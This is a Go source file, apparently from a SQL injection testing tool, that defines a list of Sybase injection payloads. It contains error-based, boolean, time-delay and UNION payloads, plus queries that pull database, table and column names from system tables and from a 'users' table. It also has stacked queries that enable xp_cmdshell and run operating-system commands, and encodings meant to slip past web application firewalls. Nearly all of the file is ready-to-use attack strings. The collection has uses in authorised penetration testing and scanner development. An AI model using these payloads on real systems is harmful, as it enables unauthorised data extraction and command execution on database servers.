package payloads

var Sybase = PayloadGroup{
	DBMS: "Sybase",
	Payloads: []Payload{
		// ═══════════════════════════════════════════
		// ERROR-BASED (Convert errors)
		// ═══════════════════════════════════════════
		{Type: "error", Content: "' AND 1=CONVERT(int, @@version)--"},
		{Type: "error", Content: "' AND 1=CONVERT(int, DB_NAME())--"},
		{Type: "error", Content: "' AND 1=CONVERT(int, USER_NAME())--"},
		{Type: "error", Content: "' AND 1=CONVERT(int, (SELECT name FROM master..sysdatabases WHERE dbid=1))--"},
		{Type: "error", Content: "' AND 1=CONVERT(int, (SELECT name FROM sysobjects WHERE id=1))--"},
		{Type: "error", Content: "' AND 1=CONVERT(int, (SELECT col_name(1,1)))--"},

		// ═══════════════════════════════════════════
		// BOOLEAN-BASED
		// ═══════════════════════════════════════════
		{Type: "boolean", Content: "' AND 1=1--", Expected: "true"},
		{Type: "boolean", Content: "' AND 1=2--", Expected: "false"},
		{Type: "boolean", Content: "' AND (SELECT 1)=(SELECT 1)--", Expected: "true"},
		{Type: "boolean", Content: "' AND (SELECT 1)=(SELECT 2)--", Expected: "false"},
		{Type: "boolean", Content: "' AND user_name()=user_name()--", Expected: "true"},
		{Type: "boolean", Content: "' AND user_name()=user_id()--", Expected: "false"},

		// ═══════════════════════════════════════════
		// TIME-BASED (WAITFOR DELAY)
		// ═══════════════════════════════════════════
		{Type: "time", Content: "'; WAITFOR DELAY '0:0:5'--"},
		{Type: "time", Content: "' AND WAITFOR DELAY '0:0:5'--"},
		{Type: "time", Content: "' AND 1=WAITFOR DELAY '0:0:5'--"},
		{Type: "time", Content: "'); WAITFOR DELAY '0:0:5'--"},
		{Type: "time", Content: "'; WAITFOR DELAY '00:00:05'--"},

		// ═══════════════════════════════════════════
		// UNION-BASED
		// ═══════════════════════════════════════════
		{Type: "union", Content: "' UNION SELECT 1--"},
		{Type: "union", Content: "' UNION SELECT 1,2--"},
		{Type: "union", Content: "' UNION SELECT 1,2,3--"},
		{Type: "union", Content: "' UNION ALL SELECT NULL,NULL,NULL--"},

		// ═══════════════════════════════════════════
		// DATA EXTRACTION
		// ═══════════════════════════════════════════
		{Type: "deep", Content: "' UNION SELECT name FROM master..sysdatabases--"},
		{Type: "deep", Content: "' UNION SELECT name FROM sysobjects WHERE type='U'--"},
		{Type: "deep", Content: "' UNION SELECT sc.name||'.'||o.name FROM sysobjects o, sysusers sc WHERE o.uid=sc.uid AND o.type='U'--"},
		{Type: "deep", Content: "' UNION SELECT c.name||':'||t.name FROM syscolumns c, systypes t WHERE c.usertype=t.usertype AND c.id=OBJECT_ID('users')--"},
		{Type: "deep", Content: "' UNION SELECT @@version--"},
		{Type: "deep", Content: "' UNION SELECT DB_NAME()--"},

		// ═══════════════════════════════════════════
		// STACKED (Command execution via xp_cmdshell)
		// ═══════════════════════════════════════════
		{Type: "stacked", Content: "'; EXEC sp_configure 'xp_cmdshell', 1; RECONFIGURE;--"},
		{Type: "stacked", Content: "'; EXEC master..xp_cmdshell 'whoami'--"},
		{Type: "stacked", Content: "' UNION SELECT 1; EXEC master..xp_cmdshell 'ipconfig'--"},

		// ═══════════════════════════════════════════
		// WAF BYPASS
		// ═══════════════════════════════════════════
		{Type: "bypass", Content: "'%00OR%201=1--"},
		{Type: "bypass", Content: "'/**/OR/**/1=1--"},
		{Type: "bypass", Content: "'%0AWAITFOR%0ADELAY%20'0:0:5'--"},
	},
}

